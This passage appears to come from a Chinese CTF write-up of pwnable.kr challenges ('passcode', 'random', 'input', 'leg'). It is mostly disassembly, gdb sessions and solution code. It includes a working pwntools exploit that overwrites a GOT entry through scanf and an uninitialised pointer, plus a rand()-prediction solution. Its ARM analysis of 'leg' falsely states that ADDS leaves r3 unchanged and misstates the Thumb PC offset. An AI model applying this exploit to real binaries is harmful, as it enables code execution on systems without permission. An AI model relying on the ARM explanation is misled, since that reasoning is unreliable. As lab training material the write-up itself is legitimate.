&lt;+104&gt;:jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485ce &lt;+106&gt;:cmpl   $0xcc07c9,-0xc(%ebp)</span><br><span class="line">   0x080485d5 &lt;+113&gt;:jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485d7 &lt;+115&gt;:movl   $0x80487a5,(%esp)</span><br><span class="line">   0x080485de &lt;+122&gt;:call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485e3 &lt;+127&gt;:movl   $0x80487af,(%esp)</span><br><span class="line">   0x080485ea &lt;+134&gt;:call   0x8048460 &lt;system@plt&gt;</span><br><span class="line">   0x080485ef &lt;+139&gt;:leave  </span><br><span class="line">   0x080485f0 &lt;+140&gt;:ret    </span><br><span class="line">   0x080485f1 &lt;+141&gt;:movl   $0x80487bd,(%esp)</span><br><span class="line">   0x080485f8 &lt;+148&gt;:call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485fd &lt;+153&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048604 &lt;+160&gt;:call   0x8048480 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>可知由于name没有清空缓冲区，所以passcode1的值可以控制，so 我们可以利用scanf来向任意地址写入东西 hiahia</p><p>思路 向fflush的got表写入地址 直接跳到成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'passcode'</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">sh = p.process(<span class="string">"./passcode"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr = 0x080485d7 -&gt; 134514135  因为输入只接受十进制的数，所以要把地址的值转化为十进制</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">96</span> + <span class="string">'\x04\xa0\x04\x08'</span> + <span class="string">'134514135'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> (sh.recvall())</span><br></pre></td></tr></table></figure><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要知道的是rand()函数的机制  这其实是是一个伪随机数</p><p>系统在调用rand（）之前都会自动调用srand()，如果用户在rand()之前曾调用过srand()给参数seed指定了一个值，那么 rand()就会将seed的值作为产生伪随机数的初始值；而如果用户在rand()前没有调用过srand()，那么系统默认将1作为伪随机数的初始 值。如果给了一个定值，那么每次rand()产生的随机数序列都是一样的~~ </p><p>所以，我们gdb看看 并且验证一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x4005f8</span><br><span class="line">Starting program: /home/random/random </span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00000000004005f8 in main ()</span><br><span class="line">(gdb) x/10i 0x04005f8</span><br><span class="line">=&gt; 0x4005f8 &lt;main+4&gt;:sub    $0x10,%rsp</span><br><span class="line">   0x4005fc &lt;main+8&gt;:mov    $0x0,%eax</span><br><span class="line">   0x400601 &lt;main+13&gt;:callq  0x400500 &lt;rand@plt&gt;</span><br><span class="line">   0x400606 &lt;main+18&gt;:mov    %eax,-0x4(%rbp)</span><br><span class="line">   0x400609 &lt;main+21&gt;:movl   $0x0,-0x8(%rbp)</span><br><span class="line">   0x400610 &lt;main+28&gt;:mov    $0x400760,%eax</span><br><span class="line">   0x400615 &lt;main+33&gt;:lea    -0x8(%rbp),%rdx</span><br><span class="line">   0x400619 &lt;main+37&gt;:mov    %rdx,%rsi</span><br><span class="line">   0x40061c &lt;main+40&gt;:mov    %rax,%rdi</span><br><span class="line">   0x40061f &lt;main+43&gt;:mov    $0x0,%eax</span><br><span class="line">(gdb) ni</span><br><span class="line">0x00000000004005fc in main ()</span><br><span class="line">(gdb) </span><br><span class="line">0x0000000000400601 in main ()</span><br><span class="line">(gdb) </span><br><span class="line">0x0000000000400606 in main ()</span><br><span class="line">(gdb) info registers</span><br><span class="line">rax            0x6b8b45671804289383</span><br><span class="line">rbx            0x00</span><br><span class="line">rcx            0x7fd956e840a4140571442692260</span><br><span class="line">rdx            0x7fd956e840a8140571442692264</span><br><span class="line">rsi            0x7ffd540f105c140726013726812</span><br><span class="line">rdi            0x7fd956e84620140571442693664</span><br><span class="line">rbp            0x7ffd540f10900x7ffd540f1090</span><br><span class="line">rsp            0x7ffd540f10800x7ffd540f1080</span><br><span class="line">r8             0x7fd956e840a4140571442692260</span><br><span class="line">r9             0x7fd956e84120140571442692384</span><br><span class="line">r10            0x47f1151</span><br><span class="line">r11            0x7fd956afbf50140571438989136</span><br><span class="line">r12            0x4005104195600</span><br><span class="line">r13            0x7ffd540f1170140726013727088</span><br><span class="line">r14            0x00</span><br><span class="line">r15            0x00</span><br><span class="line">rip            0x4006060x400606 &lt;main+18&gt;</span><br><span class="line">eflags         0x206[ PF IF ]</span><br><span class="line">cs             0x3351</span><br><span class="line">ss             0x2b43</span><br><span class="line">ds             0x00</span><br><span class="line">es             0x00</span><br><span class="line">fs             0x00</span><br></pre></td></tr></table></figure><p>然后关了再来一次，可以看到都是0x6b8b4567</p><p>然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">random@ubuntu:~$ python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Jul  <span class="number">1</span> <span class="number">2016</span>, <span class="number">15</span>:<span class="number">12</span>:<span class="number">24</span>) </span><br><span class="line">[GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = s^<span class="number">0x6b8b4567</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line"><span class="number">3039230856</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random@ubuntu:~$ ./random </span><br><span class="line"><span class="number">3039230856</span></span><br><span class="line">Good!</span><br><span class="line">Mommy, I thought libc random <span class="keyword">is</span> unpredictable...</span><br></pre></td></tr></table></figure><p>done~</p><h3 id="input"><a href="#input" class="headerlink" title="input*"></a>input*</h3><p>。。。这个，，，哎，基础太差，看看网上的吧</p><p><a href="https://werewblog.wordpress.com/2016/01/11/pwnable-kr-input/" target="_blank" rel="noopener">https://werewblog.wordpress.com/2016/01/11/pwnable-kr-input/</a></p><h3 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">"mov r3, pc\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"push&#123;r6&#125;\n"</span></span><br><span class="line"><span class="string">"addr6, pc, $1\n"</span></span><br><span class="line"><span class="string">"bxr6\n"</span></span><br><span class="line"><span class="string">".code   16\n"</span></span><br><span class="line"><span class="string">"movr3, pc\n"</span></span><br><span class="line"><span class="string">"addr3, $0x4\n"</span></span><br><span class="line"><span class="string">"push&#123;r3&#125;\n"</span></span><br><span class="line"><span class="string">"pop&#123;pc&#125;\n"</span></span><br><span class="line"><span class="string">".code32\n"</span></span><br><span class="line"><span class="string">"pop&#123;r6&#125;\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">"mov r3, lr\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Daddy has very strong arm! : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"><span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"flag"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">write(<span class="number">0</span>, buf, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I have strong leg :P\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:push&#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:addr11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:subsp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:movr3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:strr3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:ldrr0, [pc, #104]; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:bl0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:subr3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:ldrr0, [pc, #96]; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:movr1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:bl0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:bl0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:movr4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:bl0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:movr3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:addr4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:bl0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:movr3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:addr2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:ldrr3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:cmpr2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:bne0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:ldrr0, [pc, #44]; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:bl0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:ldrr0, [pc, #40]; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:bl0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:b0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:ldrr0, [pc, #32]; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:bl0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:movr3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:movr0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:subsp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:pop&#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:andeqr10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:andeqr10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:andeqr10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p>这个我觉得单单看c云里雾里，直接看汇编吧</p><p>####R14 (LR)</p><ul><li>连接寄存器 Link Register, LR</li><li>当通过BL或BLX指令调用子程序时，R14被设置成该子程序的返回地址。在子程序中，当把<strong>R14的值复制到程序计数器PC中时，子程序即返回</strong>。</li></ul><h4 id="R15-PC"><a href="#R15-PC" class="headerlink" title="R15 (PC)"></a>R15 (PC)</h4><ul><li>程序计数器 Program Counter, PC</li><li>ARM采用流水线机制，当正确读取了PC的值时，该值为当前指令地址值<strong>加8个字节</strong>。也就是说，对于ARM指令集来说，PC指向当前指令的<strong>下两条</strong>指令的地址。</li><li>ARM指令是字对齐的，PC值的第0位和第1位总为0。当使用指令STR／STM保存R15时，保存的可能是当前指令地址值加8或12字节(取决于不同芯片)</li></ul><h4 id="R0"><a href="#R0" class="headerlink" title="R0"></a>R0</h4><p>存放返回值的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00008d84 &lt;+72&gt;:addr2, r4, r3</span><br><span class="line"> 0x00008d88 &lt;+76&gt;:ldrr3, [r11, #-16]</span><br><span class="line"> 0x00008d8c &lt;+80&gt;:cmpr2, r3</span><br><span class="line"> 0x00008d90 &lt;+84&gt;:bne0x8da8 &lt;main+108&gt;</span><br><span class="line"> 0x00008d94 &lt;+88&gt;:ldrr0, [pc, #44]; 0x8dc8 &lt;main+140&gt;</span><br><span class="line"> 0x00008d98 &lt;+92&gt;:bl0x1050c &lt;puts&gt;</span><br><span class="line"> 0x00008d9c &lt;+96&gt;:ldrr0, [pc, #40]; 0x8dcc &lt;main+144&gt;</span><br><span class="line"> 0x00008da0 &lt;+100&gt;:bl0xf89c &lt;system&gt;</span><br></pre></td></tr></table></figure><p>0x00008d84地址处把r4和r3的和放到了r2，下一行再把r11-16地址处的值放到了r3，然后比较r2和r3，相等就接下去执行system</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00008d68 &lt;+44&gt;:bl0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:movr4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:bl0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:movr3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:addr4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:bl0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:movr3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:addr2, r4, r3</span><br></pre></td></tr></table></figure><p>这里可以看到，最终r2的值为三个子函数的返回值之和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>可以看到<code>mov    r3, pc</code> <code>mov    r0, r3</code>，r0 = pc = 0x00008cdc+0x8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><code>0x00008d04 &lt;+20&gt;:    mov    r3, pc</code>  <code>adds    r3, #4</code>  <code>mov    r0, r3</code></p><p>这里有一条<code>ＡＤＤＳ</code>指令，看样子像是对<code>r3</code>进行了操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00008d06 &lt;+22&gt;:    adds    r3, #41</span><br></pre></td></tr></table></figure><p>但是查一下用法，发现<code>ADDS</code> 指令只是把 <code>r3 + 4h</code> 的值存入当前状态寄存器<code>CPSR中</code>，并不对<code>ｒ３</code>的值进行修改，相当于 <code>CPSR = r3 + 4</code></p><p>（注： <code>ＡＤＤ ｒ３， #4</code> 会<code>r3</code> 进行修改，相当于 <code>r3 = r3 + 4</code>）</p><p>so r0 = pc = 0x00008d04+0x8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span 